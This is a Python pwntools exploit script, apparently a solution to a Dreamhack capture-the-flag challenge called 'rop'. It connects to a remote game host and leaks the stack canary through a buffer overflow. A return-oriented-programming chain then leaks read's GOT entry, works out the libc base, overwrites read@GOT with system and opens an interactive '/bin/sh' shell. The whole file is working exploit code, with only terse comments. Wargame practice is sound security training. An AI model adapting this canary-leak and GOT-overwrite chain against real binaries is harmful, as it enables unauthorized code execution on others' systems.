#! /bin/usr/python3

from pwn import *

def slog(name, addr):
    return success(" : ".join([name, hex(addr)]))

#p = process('./rop')
p = remote("host1.dreamhack.games", 9677)
e = ELF('./rop')
libc = ELF("./libc.so.6")

context.arch = 'amd64'

buf2sfp = 0x40
buf2cnry = buf2sfp - 0x8

payload = b'A' * (buf2cnry +1)
p.sendafter("Buf:", payload)
p.recvuntil(payload)
cnry = u64(b'\x00' + p.recvn(7))

slog("cnry", cnry)

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
pop_rdi = 0x0000000000400853
pop_rsi_r15 = 0x0000000000400851
ret = 0x0000000000400854

payload = b'A' *0x38 + p64(cnry) + b'B' * 0x8

# write(1, read_got, ..)
payload += p64(pop_rdi) + p64(1) #rdi = 1

#rsi =read_goi, r15 = 0
#usually 3rd arg = rdx, but finding rdx gadget is difficut
#and that arg is work not important in this program
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

#read(0, read_got, ...)
#GOT overwrite
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

#read("/bin/sh") == system("bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret) #stack align
payload += p64(read_plt)

p.sendafter(b'Buf: ', payload)
read = u64(p.recvn(6) + b'\x00'*2)
lb = read - libc.symbols['read'] #libc base addr
system = lb + libc.symbols['system']

slog('read', read)
slog('libc_base', lb)
slog('system', system)

#send payload about read(0, read_got, ..)
p.send(p64(system) + b'/bin/sh\x00')

p.interactive()
